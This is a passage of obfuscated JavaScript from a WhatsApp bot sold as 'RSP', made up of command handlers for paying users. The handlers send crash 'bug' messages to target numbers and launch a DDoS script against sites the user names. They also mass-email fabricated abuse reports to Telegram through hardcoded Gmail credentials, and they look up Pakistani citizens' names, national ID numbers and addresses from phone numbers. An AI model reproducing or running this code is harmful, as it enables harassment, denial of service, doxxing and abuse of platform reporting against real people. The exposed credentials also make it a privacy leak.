              return _0x7b48ae("You can't send bug to owner numbers");
            }
            _0x7b48ae("*[!] bug successfully sent to 𝚝𝚊𝚛𝚐𝚎𝚝*");
            for (let _0x26c218 = 0; _0x26c218 < 20; _0x26c218++) {
              await _0x33e181(target);
            }
            await _0x33e181(target);
            await _0x33e181(target);
            await _0x33e181(target);
            await _0x2a05a6(target);
            await _0x2a05a6(target);
            await _0x2a05a6(target);
            await _0x2a05a6(target);
            await _0xdb289d(target);
            await _0xdb289d(target);
            await _0xdb289d(target);
            await _0xdb289d(target);
          } else {
            _0x7b48ae("*_🚫 You Are Not Premium User Contact With Owner RSP To Buy Premium_*\n*Contact:* +923176851874\n*Telegram:* https://t.me/rspxlegend1");
          }
        }
        break;
      case "teleban":
        if (!_0x4ff3d7) {
          return _0x7b48ae(mess.premium);
        }
        if (!_0xc6c87) {
          return _0x7b48ae("*Example:* " + (_0x9f50af + _0x3baa40) + " <channel username>");
        }
        let _0x4bcb12 = _0xc6c87.trim();
        if (!_0x4bcb12.includes("t.me/") && !_0x4bcb12.startsWith('@')) {
          return _0x7b48ae("Invalid Telegram channel link or username. Please provide a valid link or username.");
        }
        _0x4bcb12 = _0x4bcb12.replace(/^@|https?:\/\/t\.me\/|\/$/g, '');
        const _0x12c1fb = ["Dear Telegram Support Team, I would like to report a channel with the username " + _0x4bcb12 + " for violating Telegram's Terms of Service. This channel is sharing inappropriate content and should be reviewed and banned.", "Hello Telegram Support, I am writing to report the channel " + _0x4bcb12 + " for multiple violations of your platform rules. The channel is distributing harmful content and should be banned immediately.", "Telegram Support Team, the channel " + _0x4bcb12 + " should be banned as it violates your terms of service by posting content that promotes violence and hate speech. Please take appropriate action.", "I would like to report channel " + _0x4bcb12 + " for posting illegal content. This channel consistently breaks Telegram's rules and should be banned from the platform.", "Dear Telegram Team, I am contacting you regarding channel " + _0x4bcb12 + " which is spreading misinformation and harmful content. I request that this channel be banned for violating your community guidelines.", "Telegram Support, please investigate and ban the channel " + _0x4bcb12 + " which is engaging in activities prohibited by your Terms of Service, including sharing illegal content.", "Hello Telegram, I'm reporting the channel " + _0x4bcb12 + " for copyright violations and sharing pirated content. This channel should be banned according to your platform policies.", "Telegram Support Team, channel " + _0x4bcb12 + " is distributing explicit content without proper age verification. This violates your guidelines and the channel should be banned.", "Dear Telegram, the channel " + _0x4bcb12 + " is engaging in spamming activities and should be banned from your platform as it violates your anti-spam policies.", "Telegram Support, please ban channel " + _0x4bcb12 + " for harassment and targeting of individuals. This violates your community standards and warrants immediate action.", "To the Telegram Team, I'm reporting channel " + _0x4bcb12 + " for scamming users and engaging in fraudulent activities. Please ban this channel as it violates your user safety policies.", "Telegram Support, the channel " + _0x4bcb12 + " should be banned for organizing illegal activities, which is strictly prohibited according to your Terms of Service.", "Hello Telegram Team, please review and ban the channel " + _0x4bcb12 + " which is being used to coordinate attacks on other users and platforms.", "Dear Telegram Support, I'm reporting the channel " + _0x4bcb12 + " for posting non-consensual intimate images. This channel should be banned for violating privacy and content policies.", "Telegram Team, the channel " + _0x4bcb12 + " is distributing malware and should be banned to protect users from potential security threats.", "Telegram Support Team, please investigate channel " + _0x4bcb12 + " which is impersonating public figures and organizations, violating your authenticity policies.", "Dear Telegram, channel " + _0x4bcb12 + " repeatedly posts content that glorifies violence and should be banned according to your community guidelines.", "To Telegram Support, please ban channel " + _0x4bcb12 + " which is being used for blackmail and extortion, violating both your policies and the law.", "Telegram Team, I'm reporting channel " + _0x4bcb12 + " for posting content that promotes dangerous activities that could cause physical harm to viewers.", "Dear Telegram Support, the channel " + _0x4bcb12 + " is involved in network manipulation and should be banned according to your platform integrity policies.", "Hello Telegram, please ban the channel " + _0x4bcb12 + " which is being used to coordinate targeted harassment campaigns against vulnerable communities.", "Telegram Support Team, I'm reporting channel " + _0x4bcb12 + " for posting child inappropriate content. This must be immediately banned and investigated.", "Dear Telegram, please review and ban channel " + _0x4bcb12 + " which is selling illegal substances in violation of your Terms of Service.", "Telegram Team, channel " + _0x4bcb12 + " is posting graphic violence without appropriate warnings or age restrictions and should be banned.", "To Telegram Support, please ban " + _0x4bcb12 + " for spreading dangerous conspiracy theories that have led to real-world harm.", "Telegram Support, the channel " + _0x4bcb12 + " is facilitating illegal transactions and should be banned from your platform.", "Dear Telegram Team, please ban channel " + _0x4bcb12 + " which is being used to dox individuals, severely violating privacy and safety.", "Hello Telegram Support, I'm reporting the channel " + _0x4bcb12 + " for promoting self-harm content which violates your community guidelines.", "Telegram Team, channel " + _0x4bcb12 + " should be banned for repeatedly evading previous channel bans using new accounts.", "Dear Telegram Support, please investigate and ban channel " + _0x4bcb12 + " which is organizing illegal gambling activities."];
        const _0x19a9da = nodemailer.createTransport({
          'host': "smtp.gmail.com",
          'port': 0x24b,
          'secure': false,
          'auth': {
            'user': "idowu4226@gmail.com",
            'pass': "jokk zaqw nfyh ohid"
          }
        });
        for (let _0x1a146c = 0; _0x1a146c < 3; _0x1a146c++) {
          const _0x30f60f = _0x12c1fb[Math.floor(Math.random() * _0x12c1fb.length)];
          const _0x5c557b = {
            'from': "idowu4226@gmail.com",
            'to': "abuse@telegram.org",
            'subject': "Report Abusive Telegram Channel: " + _0x4bcb12,
            'text': _0x30f60f.replace(/{channelLink}/g, _0x4bcb12)
          };
          _0x19a9da.sendMail(_0x5c557b).then(_0x2e78cf => {
            console.log("Ban report email sent (attempt " + (_0x1a146c + 1) + '/' + 3 + "): " + _0x2e78cf.response);
          })["catch"](_0x236845 => {
            console.error("Error sending ban report email (attempt " + (_0x1a146c + 1) + '/' + 3 + "): " + _0x236845);
          });
        }
        const _0x9a4757 = {
          'from': "idowu4226@gmail.com",
          'to': "dmca@telegram.org",
          'subject': "URGENT: Report Illegal Content in Channel " + _0x4bcb12,
          'text': _0x12c1fb
        };
        _0x19a9da.sendMail(_0x9a4757).then(_0x15999d => {
          console.log("Content violation report sent: " + _0x15999d.response);
        })["catch"](_0x425304 => {
          console.error("Error sending content violation report: " + _0x425304);
        });
        _0x7b48ae("✅ Sent 4 ban request reports for channel " + _0x4bcb12 + ". Channel should be reviewed by Telegram moderators within 24-48 hours.");
        break;
      case "cnicdata":
      case "simdata":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!q) {
            return _0x7b48ae("💡 *Provide a phone number*\n> Example: " + (_0x9f50af + _0x3baa40) + " 0333XXXXXXX");
          }
          if (!q) {
            return reply("⚠ Enter a valid phone number.");
          }
          _0x7b48ae("⏳ _Getting data..._");
          try {
            let _0x358dd8 = "https://fam-official.serv00.net/sim/famdata.php?num=" + q;
            let _0x1d8388 = await axios.get(_0x358dd8);
            let _0x2377ea = _0x1d8388.data;
            console.log(_0x2377ea);
            let _0x274d57 = "📱 *𝙷𝚎𝚛𝚎 𝚒𝚜 𝙳𝚊𝚝𝚊 𝙵𝚘𝚞𝚗𝚍𝚎𝚍:*\n";
            _0x2377ea.data.forEach((_0x1b0200, _0x297b7b) => {
              _0x274d57 += "*📌 Record " + (_0x297b7b + 1) + "*\n";
              _0x274d57 += "👤 *Name:* " + _0x1b0200.name + "\n";
              _0x274d57 += "📞 *Mobile:* " + _0x1b0200.mobile + "\n";
              _0x274d57 += "💳 *CNIC:* " + _0x1b0200.cnic + "\n";
              _0x274d57 += "🗺️ *Address:* " + _0x1b0200.address + "\n\n";
            });
            _0x7b48ae(_0x274d57);
          } catch (_0x1fbc90) {
            console.error("API Error:", _0x1fbc90);
            _0x7b48ae("⚠ Error fetching SIM data. Try again later.");
          }
        }
        break;
      case "ipinfo":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!q) {
            return _0x7b48ae("💡 *Provide an IP address*\n> Example: " + (_0x9f50af + _0x3baa40) + " 223.123.113.215");
          }
          if (!q) {
            return reply("⚠ Enter a valid IP address.");
          }
          _0x7b48ae("⏳ _Getting data..._");
          try {
            let _0x42e652 = "https://ip-info.bjcoderx.workers.dev/?ip=" + q;
            let _0x12cb82 = await axios.get(_0x42e652);
            let _0x20123d = _0x12cb82.data;
            console.log(_0x20123d);
            let _0x37729a = "🌐 *IP Information:*\n";
            _0x37729a += "*IP:* " + _0x20123d.ip + "\n";
            _0x37729a += "*Continent:* " + _0x20123d.continent_name + " (" + _0x20123d.continent_code + ")\n";
            _0x37729a += "*Country:* " + _0x20123d.country_name_official + " (" + _0x20123d.country_code2 + ")\n";
            _0x37729a += "*Country Capital:* " + _0x20123d.country_capital + "\n";
            _0x37729a += "*State/Province:* " + _0x20123d.state_prov + " (" + _0x20123d.state_code + ")\n";
            _0x37729a += "*District:* " + _0x20123d.district + "\n";
            _0x37729a += "*City:* " + _0x20123d.city + "\n";
            _0x37729a += "*Zipcode:* " + _0x20123d.zipcode + "\n";
            _0x37729a += "*Latitude:* " + _0x20123d.latitude + "\n";
            _0x37729a += "*Longitude:* " + _0x20123d.longitude + "\n";
            _0x37729a += "*ISP:* " + _0x20123d.isp + "\n";
            _0x37729a += "*Organization:* " + _0x20123d.organization + "\n";
            _0x37729a += "*Connection Type:* " + _0x20123d.connection_type + "\n";
            _0x37729a += "*Currency:* " + _0x20123d.currency.name + " (" + _0x20123d.currency.code + ") - " + _0x20123d.currency.symbol + "\n";
            _0x37729a += "*Time Zone:* " + _0x20123d.time_zone.name + " (UTC" + (_0x20123d.time_zone.offset >= 0 ? '+' : '') + _0x20123d.time_zone.offset + ")\n";
            _0x37729a += "*Current Time:* " + _0x20123d.time_zone.current_time + "\n";
            _0x37729a += "*Country Emoji:* " + _0x20123d.country_emoji + "\n";
            _0x37729a += "*Calling Code:* " + _0x20123d.calling_code + "\n";
            _0x37729a += "*Country TLD:* " + _0x20123d.country_tld + "\n";
            _0x37729a += "*Languages:* " + _0x20123d.languages + "\n";
            _0x7b48ae(_0x37729a);
          } catch (_0x433809) {
            console.error("API Error:", _0x433809);
            _0x7b48ae("⚠ Error fetching IP information. Try again later.");
          }
        }
        break;
      case "apk":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!_0xc6c87) {
            return _0x7b48ae("Provide an APK name\n> Example: " + (_0x9f50af + _0x3baa40) + " telegram");
          }
          if (!_0xc6c87) {
            return _0x7b48ae("Enter a valid APK name.");
          }
          _0x7b48ae("Searching APKs...");
          try {
            let _0x11e719 = "https://apk-downloader.bjcoderx.workers.dev/?query=" + _0xc6c87;
            let _0x20d77f = await axios.get(_0x11e719, {
              'timeout': 0x2710
            });
            let _0x1798b1 = _0x20d77f.data;
            console.log(_0x1798b1);
            let _0x279b68 = _0x1798b1.map(_0x8817be => {
              return "> Please Wait Apk Downloading...\n*" + _0x8817be.name + "* (v" + _0x8817be.version + ") - " + _0x8817be["package"] + "\nDownloads: " + _0x8817be.downloads + " Rating: " + _0x8817be.rating + "\nDownload Link: " + _0x8817be.path;
            }).join("\n\n");
            _0x2d3082.sendMessage(_0x2d06fa.chat, {
              'text': _0x279b68
            }, {
              'quoted': _0x2d06fa
            });
            let _0x176f3e = _0x20d77f.data;
            console.log(_0x176f3e);
            if (_0x176f3e.length > 0) {
              let _0x15006f = _0x176f3e[0];
              console.log("Downloading " + _0x15006f.name + ".apk (" + (parseFloat(_0x15006f.filesize.replace(" MB", '')) || 0).toFixed(2) + " MB)...");
              let _0x4c3dcc = await axios.get(_0x15006f.path, {
                'responseType': "arraybuffer",
                'onDownloadProgress': _0x5abb09 => {
                  let _0x379d06 = _0x5abb09.loaded * 100 / _0x5abb09.total;
                  console.log("Downloading " + _0x15006f.name + ".apk: " + _0x379d06.toFixed(2) + '%');
                }
              });
              console.log("Downloaded " + _0x15006f.name + ".apk (" + (parseFloat(_0x15006f.filesize.replace(" MB", '')) || 0).toFixed(2) + " MB).");
              _0x2d3082.sendMessage(_0x2d06fa.chat, {
                'document': _0x4c3dcc.data,
                'mimetype': "application/vnd.android.package-archive",
                'fileName': _0x15006f.name + ".apk"
              }, {
                'quoted': _0x2d06fa
              });
            } else {
              _0x7b48ae("No APKs found.");
            }
          } catch (_0x10ab43) {
            console.error("API Error:", _0x10ab43);
            _0x7b48ae("Error searching APKs. Try again later.");
          }
        }
        break;
      case "video":
        {
          if (!_0xc6c87) {
            return _0x7b48ae("Provide a video URL\n> Example: " + (_0x9f50af + _0x3baa40) + " *https://youtube... | TikTok | Facebook | Instagram | Snapchat and any Social Media Link For Video*");
          }
          if (!_0xc6c87) {
            return _0x7b48ae("Enter a valid video URL.");
          }
          _0x7b48ae("Getting data...");
          try {
            let _0x435b1c = "https://api-by.eternalowner06.workers.dev/?url=" + _0xc6c87;
            let _0x40db17 = await axios.get(_0x435b1c, {
              'timeout': 0x2710
            });
            let _0x34e140 = _0x40db17.data;
            console.log(_0x34e140);
            let _0x248925 = _0x34e140.medias && _0x34e140.medias[0] && _0x34e140.medias[0].url;
            if (_0x248925) {
              _0x2d3082.sendMessage(_0x2d06fa.chat, {
                'video': {
                  'url': _0x248925
                },
                'caption': _0x34e140.title
              }, {
                'quoted': _0x2d06fa
              });
            } else {
              _0x7b48ae("Error fetching video. Try again later.");
            }
          } catch (_0x1c90bf) {
            console.error("API Error:", _0x1c90bf);
            _0x7b48ae("Error fetching video. Try again later.");
          }
        }
        break;
      case "audio":
        {
          if (!_0xc6c87) {
            return _0x7b48ae("Provide a video URL\n> Example: " + (_0x9f50af + _0x3baa40) + " *https://youtube... | TikTok | Facebook | Instagram | Snapchat and any Social Media Link For Audio*");
          }
          if (!_0xc6c87) {
            return _0x7b48ae("Enter a valid video URL.");
          }
          _0x7b48ae("Getting data...");
          try {
            let _0x9c0bb2 = "https://api-by.eternalowner06.workers.dev/?url=" + _0xc6c87;
            let _0x29bcdc = await axios.get(_0x9c0bb2, {
              'timeout': 0x2710
            });
            let _0x455ee5 = _0x29bcdc.data;
            console.log(_0x455ee5);
            let _0x511fa2 = _0x455ee5.medias && _0x455ee5.medias[0] && _0x455ee5.medias[0].url;
            if (_0x511fa2) {
              _0x2d3082.sendMessage(_0x2d06fa.chat, {
                'video': {
                  'url': _0x511fa2
                },
                'caption': _0x455ee5.title
              }, {
                'quoted': _0x2d06fa
              });
            } else {
              _0x7b48ae("Error fetching video. Try again later.");
            }
          } catch (_0x111ec1) {
            console.error("API Error:", _0x111ec1);
            _0x7b48ae("Error fetching video. Try again later.");
          }
        }
        break;
      case "menu":
      case "help":
      case "alive":
      case "RSP":
      case "allmenu":
        {
          const _0x365d22 = "Hello Dear " + _0x3f56f8 + "\n˜”°º× " + _0xd90589 + " 🙂\n➲ 𝗪𝗲𝗹𝗰𝗼𝗺𝗲 𝗧𝗼 𝑹𝑺𝑷 𝗩𝟭𝟴 𝗶 𝗵𝗼𝗽 𝘆𝗼𝘂 𝘄𝗶𝗹𝗹 𝗲𝗻𝗷𝗼𝘆 ヅ\n✹𝑹𝑼𝑵𝑻𝑰𝑴𝑬: " + _0x44b2bf(process.uptime()) + "\n✹𝑶𝑾𝑵𝑬𝑹: 尺 丂 卩\n✹𝑵𝑼𝑴𝑩𝑬𝑹: +923176851874\n༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅༅\n> ** (👑) \n➲ 𝐀𝐍𝐃𝐑𝐎𝐈𝐃 𝐁𝐔𝐆  🧪\n> *_.bug1_* 92xxx \n> *_.bug2_* 92xxx \n> *_.bug3_* 92xxx \n> *_.ui-crash_* 92xxx \n\n➲ 𝐈𝐏𝐇𝐎𝐍𝐄 𝐁𝐔𝐆 🧪\n> *_.ios-kil5_* 92xxx \n> *_.ios-fc5_* 92xxx\n> *_.iphone-fack_* 92xxx\n\n➲ 𝐅𝐎𝐑𝐂𝐄 𝐁𝐔𝐆 ✮\n> *_.forceblock_* amount (in chat)_*\n> *_.forcegroup_* groupid|amount_*\n\n➲ 𝐁𝐔𝐆 𝐎𝐓𝐇𝐄𝐑𝐒 🧪\n> *_.ddos_* web\n> *_.checkhost_* web\n\n➲ 𝐁𝐀𝐍𝐍𝐈𝐍𝐆 😈\n> *_.teleban_* <username/link> \n\n➲ 𝐏𝐀𝐊𝐈𝐒𝐓𝐀𝐍 𝐒𝐈𝐌-𝐃𝐀𝐓𝐀 🇵🇰\n> *_.simdata_* 03xxx (only 🇵🇰)\n> *_.cnicdata_* 31304xxx (only 🇵🇰)\n\n➲ 𝐓𝐎𝐎𝐋𝐒 𝐌𝐄𝐍𝐔 ❤️‍🔥\n> *_video_* (Download any video via link)\n> *_.apk_* (Download any app)\n> *_.iginfo_* (Instagram Id check)\n> *_.ipinfo_* (Track Any Ip Location)\n\n➲ 𝐎𝐖𝐍𝐄𝐑 💀\n> *_.autostatus_*\n> *_.autoreply_*\n> *_.autoreact_*\n> *_.reqpair_* 92xxx\n> *_.delpair_* 92xxx\n> *_.listgc_*\n> *_.group-id_* <linkgc>\n> *_.idch_* <link channel>\n> *_.rvo_* (reply chat)";
          _0x2d3082.sendMessage(_0x2d06fa.chat, {
            'video': fs.readFileSync("./RSPMedia/RSP2.mp4"),
            'caption': _0x365d22,
            'gifPlayback': true,
            'contextInfo': {
              'forwardingScore': 0x3e7,
              'isForwarded': true,
              'mentionedJid': [_0x1de310],
              'forwardedNewsletterMessageInfo': {
                'newsletterName': "Join RSP Channel 🔥",
                'newsletterJid': "0029VbB5fdg9xVJnrkIIVg3f@newsletter"
              },
              'externalAdReply': {
                'showAdAttribution': true,
                'title': "Join RSP Channel 🔥",
                'body': "Best WhatsApp Bot 💻",
                'thumbnailUrl': "https://i.postimg.cc/FsJzycB3/Pass-ios-RSPx-Legend-YT.jpg",
                'sourceUrl': "https://whatsapp.com/channel/0029VbB5fdg9xVJnrkIIVg3f",
                'mediaType': 0x1,
                'renderLargerThumbnail': true
              }
            }
          }, {
            'quoted': _0x2d06fa
          });
        }
        break;
      case "autoreact":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          const _0x22e024 = _0x2d06fa.text.split(" ");
          if (_0x22e024[1] && _0x22e024[1].toLowerCase() === 'on') {
            reacts.autoreact = true;
            fs.writeFileSync("./RSPPlugins/reacts.json", JSON.stringify(reacts, null, 2));
            _0x7b48ae("Auto react enabled");
          } else {
            if (_0x22e024[1] && _0x22e024[1].toLowerCase() === "off") {
              reacts.autoreact = false;
              fs.writeFileSync("./RSPPlugins/reacts.json", JSON.stringify(reacts, null, 2));
              _0x7b48ae("Auto react disabled");
            } else {
              if (_0x22e024[1] && _0x22e024[1].toLowerCase() === "add") {
                if (!_0x22e024[2]) {
                  return _0x7b48ae("Please provide an emoji to add");
                }
                const _0x16ffc7 = _0x22e024.slice(2);
                reacts.reactEmojis.push(..._0x16ffc7);
                fs.writeFileSync("./RSPPlugins/reacts.json", JSON.stringify(reacts, null, 2));
                _0x7b48ae("Added " + _0x16ffc7.join(", ") + " to react emojis");
              } else {
                if (_0x22e024[1] && _0x22e024[1].toLowerCase() === "remove") {
                  if (!_0x22e024[2]) {
                    return _0x7b48ae("Please provide an emoji to remove");
                  }
                  const _0x3a2c90 = _0x22e024.slice(2);
                  reacts.reactEmojis = reacts.reactEmojis.filter(_0x350601 => !_0x3a2c90.includes(_0x350601));
                  fs.writeFileSync("./RSPPlugins/reacts.json", JSON.stringify(reacts, null, 2));
                  _0x7b48ae("Removed " + _0x3a2c90.join(", ") + " from react emojis");
                } else if (_0x22e024[1] && _0x22e024[1].toLowerCase() === "list") {
                  _0x7b48ae("React Emojis: " + reacts.reactEmojis.join(", "));
                } else {
                  _0x7b48ae("Invalid command usage.\nExp: .autoreact on\n.autoreact off\n.autoreact add (emojis)\n.autoreact remove (emojis)\n.autoreact list");
                }
              }
            }
          }
        }
        break;
      case "autostatus":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!_0xc6c87.includes('on') && !_0xc6c87.includes("off")) {
            return _0x7b48ae("*Usage:* " + _0x9f50af + "autostatus on/off");
          }
          const _0x2e719c = !!_0xc6c87.includes('on');
          await _0x282351(_0x2e719c);
          if (_0x2e719c) {
            _0x7b48ae("*Auto status enabled!*");
          } else {
            _0x7b48ae("*Auto status disabled!*");
          }
        }
        break;
      case "autoreply":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          const _0x531b69 = _0x2d06fa.text.split(" ");
          if (_0x531b69.length < 2) {
            return _0x7b48ae("Invalid command usage.\n.autoreply add Hi bro|Yes bro\n.autoreply remove Hi bro\n.autoreply list");
          }
          if (_0x531b69[1].toLowerCase() === "add") {
            if (!_0x2d06fa.text.includes(" add ") || !_0x2d06fa.text.includes('|')) {
              return _0x7b48ae("Invalid command usage.\n.autoreply add Hi bro|Yes bro");
            }
            const _0x3adb32 = _0x2d06fa.text.split(" add ")[1].split('|');
            if (_0x3adb32.length < 2) {
              return _0x7b48ae("Invalid command usage.\n.autoreply add Hi bro|Yes bro");
            }
            const _0x2c036a = _0x3adb32[0].trim().toLowerCase();
            const _0x43f979 = _0x3adb32[1].trim();
            _0x5ec53a.autoreplies.push({
              'trigger': _0x2c036a,
              'reply': _0x43f979
            });
            fs.writeFileSync("./RSPPlugins/autoreplies.json", JSON.stringify(_0x5ec53a, null, 2));
            _0x2d3082.sendMessage(_0x2d06fa.chat, {
              'text': "Auto-reply added for \"" + _0x2c036a + "\""
            });
          } else {
            if (_0x531b69[1].toLowerCase() === "remove") {
              const _0x35bbd5 = _0x531b69.slice(2).join(" ").toLowerCase();
              if (!_0x35bbd5) {
                return _0x7b48ae("Invalid command usage.\n.autoreply remove Hi bro");
              }
              _0x5ec53a.autoreplies = _0x5ec53a.autoreplies.filter(_0x33bf8a => _0x33bf8a.trigger !== _0x35bbd5);
              fs.writeFileSync("./RSPPlugins/autoreplies.json", JSON.stringify(_0x5ec53a, null, 2));
              _0x7b48ae("Auto-reply removed for \"" + _0x35bbd5 + "\"");
            } else {
              if (_0x531b69[1].toLowerCase() === "list") {
                let _0x1630a9 = "Auto-replies:\n";
                _0x5ec53a.autoreplies.forEach(_0x10582e => {
                  _0x1630a9 += _0x10582e.trigger + " -> " + _0x10582e.reply + "\n";
                });
                _0x7b48ae(_0x1630a9);
              } else {
                _0x7b48ae("Invalid command usage.\n.autoreply add Hi bro|Yes bro\n.autoreply remove Hi bro\n.autoreply list");
              }
            }
          }
        }
        break;
      case "ddos":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!q.includes(" ")) {
            return _0x7b48ae("Use Methode: ." + _0x3baa40 + " <target> <time>\nExaple: ." + _0x3baa40 + " example.xyz 60");
          }
          if (q.includes("dgxeon.shop")) {
            return _0x7b48ae("Cannot attack developer's site");
          }
          const _0x35f38f = q.substring(0, q.indexOf(" ") - 0);
          const _0x24396e = q.substring(q.lastIndexOf(" ") + 1);
          _0x7b48ae("Bot is attacking " + _0x35f38f + " with time " + _0x24396e);
          exec("node ddos.js " + _0x35f38f + " " + _0x24396e, {
            'maxBuffer': 1048576
          }, (_0x476014, _0x48b5a0, _0x38c01e) => {
            if (_0x476014) {
              _0x7b48ae("Error: " + _0x476014.message);
              return;
            }
            if (_0x38c01e) {
              _0x7b48ae("Error: " + _0x38c01e);
              return;
            }
            _0x7b48ae("Success\n\n🤙 target: " + _0x35f38f + ",\n🤙 Time: " + _0x24396e);
          });
        }
        break;
      case "enc":
      case "encrypt":
        {
          const _0x12fff7 = require("js-confuser");
          const _0x431d64 = "Usage Example:\n" + (_0x9f50af + _0x3baa40) + " (Input text or reply text to obfuscate code)\n" + (_0x9f50af + _0x3baa40) + " doc (Reply to a document)";
          let _0x223def;
          if (_0xd22d6a.length >= 1) {
            _0x223def = _0xd22d6a.join(" ");
          } else {
            if (_0x2d06fa.quoted && _0x2d06fa.quoted.text) {
              _0x223def = _0x2d06fa.quoted.text;
            } else {
              return _0x7b48ae(_0x431d64);
            }
          }
          try {
            let _0x29f502;
            if (_0x223def === "doc" && _0x2d06fa.quoted && _0x2d06fa.quoted.mtype === "documentMessage") {
              let _0x4ed151;
              if (_0x2d06fa.quoted.mimetype) {
                _0x4ed151 = await _0x2d06fa.quoted.download();
              }
              _0x29f502 = _0x4ed151.toString("utf-8");
            } else {
              _0x29f502 = _0x223def;
            }
            const _0x348796 = {
              'target': "node",
              'preset': "high",
              'compact': true,
              'minify': true,
              'flatten': true,
              'identifierGenerator': function () {
                function _0x1a9cae(_0x4985bd) {
                  let _0x24fbe6 = '';
                  const _0x2dd207 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
                  for (let _0x27d947 = 0; _0x27d947 < _0x4985bd; _0x27d947++) {
                    _0x24fbe6 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x2dd207));
                  }
                  return _0x24fbe6;
                }
                return "素晴座素晴難RSP素晴座素晴難素晴座素晴難RSP素晴座素晴難".replace(/[^a-zA-Z座Nandokuka素Muzukashī素晴]/g, '') + _0x1a9cae(2);
              },
              'renameVariables': true,
              'renameGlobals': true,
              'stringEncoding': true,
              'stringSplitting': 0x0,
              'stringConcealing': true,
              'stringCompression': true,
              'duplicateLiteralsRemoval': 0x1,
              'shuffle': {
                'hash': 0x0,
                'true': 0x0
              },
              'stack': true,
              'controlFlowFlattening': 0x1,
              'opaquePredicates': 0.9,
              'deadCode': 0x0,
              'dispatcher': true,
              'rgf': false,
              'calculator': true,
              'hexadecimalNumbers': true,
              'movedDeclarations': true,
              'objectExtraction': true,
              'globalConcealing': true
            };
            const _0x234904 = await _0x12fff7.obfuscate(_0x29f502, _0x348796);
            fs.writeFileSync("./enc_by_@RSP.js", _0x234904);
            await _0x2d3082.sendMessage(_0x2d06fa.chat, {
              'document': {
                'url': "./enc_by_@RSP.js"
              },
              'mimetype': "application/javascript",
              'fileName': "Encrypted By @RSP.js"
            }, {
              'quoted': _0x2d06fa
            });
          } catch (_0x20413f) {
            const _0x128cba = "There is an error: " + _0x20413f.message;
            await _0x7b48ae(_0x128cba);
          }
        }
        break;
      case "dec":
      case "decrypt":
        {
          const {
            webcrack: _0x517e5c
          } = await import("webcrack");
          const _0xbba2ea = "Usage Example:\n" + (_0x9f50af + _0x3baa40) + " (Input text or reply text to dec code)\n" + (_0x9f50af + _0x3baa40) + " doc (Reply to a document)";
          let _0x8d1db4;
          if (_0xd22d6a.length >= 1) {
            _0x8d1db4 = _0xd22d6a.join(" ");
          } else {
            if (_0x2d06fa.quoted && _0x2d06fa.quoted.text) {
              _0x8d1db4 = _0x2d06fa.quoted.text;
            } else {
              return _0x7b48ae(_0xbba2ea);
            }
          }
          try {
            let _0x5c3852;
            if (_0x8d1db4 === "doc" && _0x2d06fa.quoted && _0x2d06fa.quoted.mtype === "documentMessage") {
              let _0x2b2476;
              if (_0x2d06fa.quoted.mimetype) {
                _0x2b2476 = await _0x2d06fa.quoted.download();
              }
              _0x5c3852 = await _0x517e5c(_0x2b2476.toString("utf-8"));
            } else {
              _0x5c3852 = await _0x517e5c(_0x8d1db4);
            }
            fs.writeFileSync("./dec_by_@RSP.js", _0x5c3852.code);
            await _0x2d3082.sendMessage(_0x2d06fa.chat, {
              'document': {
                'url': "./dec_by_@RSP.js"
              },
              'mimetype': "application/javascript",
              'fileName': "Decrypted By @RSP"
            }, {
              'quoted': _0x2d06fa
            });
          } catch (_0x5f47c1) {
            const _0xe3f7f8 = "There is an error: " + _0x5f47c1.message;
            await _0x7b48ae(_0xe3f7f8);
          }
        }
        break;
      case "readviewonce":
      case "rvo":
        {
          if (!_0x4ff3d7) {
            return _0x7b48ae(mess.premium);
          }
          if (!_0x2d06fa.quoted) {
            return _0x7b48ae("Reply to view once message");
          }
          let _0x325214 = await _0x2d3082.downloadMediaMessage(_0x2d06fa.quoted);
          if (_0x325214) {
            if (_0x2d06fa.quoted.mtype === "imageMessage") {
              return _0x2d3082.sendMessage(_0x2d06fa.chat, {
                'image': _0x325214,
                'caption': ''
              });
            } else {
              if (_0x2d06fa.quoted.mtype === "videoMessage") {
                return _0x2d3082.sendMessage(_0x2d06fa.chat, {
                  'video': _0x325214
                });
              } else {
                return _0x2d06fa.quoted.mtype === "pttMessage" || _0x2d06fa.quoted.mtype === "audioMessage" ? _0x2d3082.sendMessage(_0x2d06fa.chat, {
                  'audio': _0x325214,
                  'mimetype': "audio/mp4",
                  'ptt': _0x2d06fa.quoted.mtype === "pttMessage"
                }) : _0x2d3082.sendMessage(_0x2d06fa.chat, {
                  'document': _0x325214
                });
              }
            }
          } else {
            _0x7b48ae("Failed to download media");
          }
        }
        break;
      case "clearchat":
        {
          _0x2d06fa.reply("\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n");
        }
        break;
      case "checkhost":
        {
          if (!q) {
            return _0x7b48ae("Example : " + (_0x9f50af + _0x3baa40) + " https://nxnn.com");
          }
          let _0x2e5077 = {
            'viewOnceMessage': {
              'message': {
                'interactiveMessage': {
                  'header': {
                    'title': '',
                    'subtitle': 'p'
                  },
                  'body': {
                    'text': "Click Check Host To Check Web"
                  },
                  'footer': {
                    'text': "Best WhatsApp Bot 💻"
                  },
                  'nativeFlowMessage': {
                    'buttons': [{
                      'name': "cta_url",
                      'buttonParamsJson': JSON.stringify({
                        'display_text': "Check Host",
                        'url': "https://check-host.net/check-http?host=" + q,
                        'merchant_url': "https://check-host.net/check-http?host=" + q
                      })
                    }],
                    'messageParamsJson': ''
                  }
                }
              }
            }
          };
          _0x2d3082.relayMessage(_0x2d06fa.chat, _0x2e5077, {});
        }
        break;
      case "addresell":
      case "addreseller":
        {
